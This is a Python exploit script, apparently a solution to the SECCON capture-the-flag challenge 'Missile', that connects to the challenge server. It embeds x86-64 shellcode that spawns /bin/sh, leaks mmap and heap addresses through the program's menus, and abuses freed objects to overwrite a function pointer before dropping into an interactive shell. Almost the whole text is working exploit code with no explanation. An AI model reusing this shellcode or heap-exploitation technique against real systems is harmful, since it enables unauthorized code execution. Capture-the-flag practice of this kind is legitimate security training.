import pwnbox,struct
#p = pwnbox.pipe.ProcessPipe("./Missile")
p = pwnbox.pipe.SocketPipe("missile.pwn.seccon.jp",9999)
unpack = lambda x : struct.unpack("<Q",x)[0]
pack = lambda x: struct.pack("<Q",x)


SH = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
def add_op(name, part, rank):
  p.read_until(":")
  p.write("3\n")
  p.read_until(":")
  p.write("2\n")
  for x in [name,part,rank]:
    p.read_until(":")
    p.write(x)

  p.read_until(":")
  p.write("4\n")


def add_mis(op,name,loc):
  p.read_until(":")
  p.write("2\n")
  p.read_until(":")
  p.write("2\n")
  for x in ["%d\n"%op,name,loc]:
    p.read_until(":")
    p.write(x)

  p.read_until(":")
  p.write("5\n")

def del_mis(idx):
  p.read_until(":")
  p.write("2\n")
  p.read_until(":")
  p.write("4\n")
  p.read_until(":")
  p.write("%d\n"%idx)
  p.read_until(":")
  p.write("5\n")

def add_weapon(op,name,loc):
  p.read_until(":")
  p.write("1\n")
  p.read_until(":")
  p.write("2\n")
  for x in ["%d\n"%op,name,loc]:
    p.read_until(":")
    p.write(x)

  p.read_until(":")
  p.write("5\n")

def del_func(idx,no=True):
  if not no:
    p.read_until(":")
    p.write("4\n")
  p.read_until(":")
  p.write("2\n")
  p.read_until(":")
  p.write("%d\n"%idx)
  p.read_until(":")
  if not no:
    p.read_until(":")
    p.write("5\n")

def add_func(op,name,reason):
  p.read_until(":")
  p.write("3\n")
  for x in ["%d\n"%op,name,reason]:
    p.read_until(":")
    p.write(x)
  
add_op("\x90"*20+"\n",SH[:20]+"\n",SH[20:]+"\n")
add_mis(0,"A"*0x15,"B"*0x23)
p.read_until(":")
p.write("2\n")
p.read_until(":")
p.write("1\n")
p.read_until("AAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")
mmap = unpack(p.read_until("\nMissile storage location").split("\nMissile storage location")[0][:8].ljust(8,"\x00"))
print hex(mmap)
del_func(1,False)
del_func(3,False)
p.write("\n")
p.read_until("3) ")
heap = unpack(p.read_until("\n4) ").split("\n4) ")[0][:8].ljust(8,"\x00"))
p.read_until(":")
p.write("4\n")
del_func(4)
del_func(2)

code = 0x403132
code = 0x402ee8
code = 0x4027a7
code = 0x4628e7
#code = mmap
add_func(0,"A"*0x20+pack(code),"B"*0x10+"\n")
add_func(0,"A"*0x20+pack(code),"B"*0x10+"\n")
p.read_until("Exit")
p.write("1\n")
p.read_until(":")
p.write("2\n")
p.read_until(":")
p.write(pack(mmap)+"V"*8+"\n")
print hex(mmap)
raw_input()
p.write("5\n")
p.write("2\n")
p.write("5\n")

p.interact()
